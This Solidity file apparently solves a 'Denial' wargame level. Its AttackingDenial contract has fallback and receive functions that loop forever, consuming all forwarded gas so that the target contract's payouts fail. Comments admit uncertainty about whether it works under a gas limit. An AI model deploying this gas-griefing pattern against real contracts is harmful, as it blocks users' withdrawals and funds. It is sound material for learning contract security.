// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    // Infinite loops (theoretically?) eat up all the gas
    // (though this is failing if we put an explicit `gasLimit` on the call in tests?)
    // TODO: determine why this isn't failing for all calls
    fallback() external payable {
        while (true) {}
    }

    receive() external payable {
        while (true) {}
    }
}
